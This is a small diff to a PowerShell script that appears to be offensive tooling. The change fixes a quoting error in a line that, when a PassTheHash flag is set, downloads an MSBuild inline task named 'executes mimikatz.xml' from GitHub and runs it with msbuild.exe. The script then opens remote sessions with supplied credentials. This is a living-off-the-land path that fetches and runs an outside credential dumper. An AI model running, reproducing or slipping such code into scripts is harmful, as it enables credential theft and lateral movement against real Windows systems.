@@ -128,7 +128,7 @@ function ConvertFrom-SecureToPlain {
       } until ($input -in '1','2','3','4')
 
 
-if(Test-Path variable:global:PassTheHash) { Invoke-WebRequest -Uri https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml" -Outfile SimpleTasks.csproj
+if(Test-Path variable:global:PassTheHash) { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml" -Outfile SimpleTasks.csproj
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe } else { Write-Host ""
 $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 $RDP = New-PSSession -Computer $computer -credential $credential }
